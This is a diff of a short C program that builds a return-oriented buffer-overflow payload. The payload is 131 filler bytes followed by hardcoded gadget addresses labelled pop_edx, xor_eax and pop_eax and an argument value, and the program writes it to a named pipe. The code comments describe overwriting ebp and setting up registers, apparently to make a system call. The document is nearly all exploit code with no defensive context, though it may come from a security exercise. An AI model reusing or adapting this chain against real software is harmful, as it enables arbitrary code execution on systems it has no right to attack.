@@ -7,16 +7,26 @@
 
 int main(void)
 {
-  char bufr[138];
+  char bufr[143];
   char trap[] = "\xe5\xb6\xa9\xbb";
+  char xor_eax[] = "\xc2\xb3\xa9\xbb";
   char pop_eax[] = "\xe1\xa0\xb9\xbb";
+  char pop_edx[] = "\x1b\xdc\xb9\xbb";
+
+  char exec_arg[] = "\x01\x01\x01\x3b";
+
   int i;
   // Fill up buffer
   for(i = 0; i < 131; i++)
     memcpy(bufr + i, "\x01",1);
-  
-  strcpy(bufr + 131, pop_eax);
-  memcpy(bufr + 135, 59, 8);
+
+  // overwrite ebp
+  // pop arg into edx
+  strcpy(bufr + 131, pop_edx);
+  strcpy(bufr + 135, exec_arg);
+  // clear eax
+  strcpy(bufr + 139, xor_eax);  
+
   writecmd(PIPEPATH, bufr);
   
   return 0;
